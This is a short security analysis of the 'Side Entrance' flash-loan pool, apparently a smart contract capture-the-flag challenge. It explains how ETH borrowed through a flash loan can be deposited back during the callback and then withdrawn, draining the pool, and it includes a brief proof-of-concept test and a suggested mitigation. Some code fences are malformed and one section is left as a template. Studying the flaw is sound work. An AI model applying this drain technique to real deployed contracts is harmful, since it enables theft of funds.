
# Side Entrance — Security Analysis

## 1. Overview
Briefly describe the Side Entrance lending pool and its flash loan mechanism.

## 2. Vulnerability
Explain how the pool's flash loan callback interacts with its `deposit()` function.

The pool checks whether its ETH balance has been restored after the callback. However, it does not distinguish between a genuine flash loan repayment and a deposit made using the borrowed ETH.

## 3. Root Cause

The vulnerable logic is:

```javascript
```solidity

function deposit() external payable {
    balances[msg.sender] += msg.value;
}
 ```
 
```solidity

if (address(this).balance < balanceBefore) {
    revert RepayFailed();
}
```
 ```
 
The pool checks its ETH balance but does not account for the fact that the callback can create a withdrawal claim for the borrower.

## 4. Impact

An attacker can use the flash loan callback to deposit the borrowed ETH into the pool under their own address, then withdraw the credited balance after the flash loan completes.

This allows the attacker to drain the pool's ETH.

## 5. Proof of Concept (PoC)

  ```javascript
  
    function testExploit() public {
        // Check initial balances
        assertEq(address(pool).balance, 1000 ether);
        assertEq(address(attacker).balance, 0);

        // Execute both calls as the attacker
        vm.startPrank(address(attacker));

        pool.flashLoan(1000 ether);
        pool.withdraw();

        vm.stopPrank();

        // Check final balances
        assertEq(address(pool).balance, 0);
        assertEq(address(attacker).balance, 1000 ether);
    }
    ```

## 6. Recommended Mitigation

Separate flash loan repayment accounting from user deposit accounting. The pool should verify repayment without allowing borrowed funds deposited during the callback to create an independently withdrawable balance.

## 7. Conclusion

The vulnerability occurs because the pool treats restoration of its ETH balance as sufficient proof of repayment, while its deposit mechanism simultaneously credits the borrower with a withdrawal claim.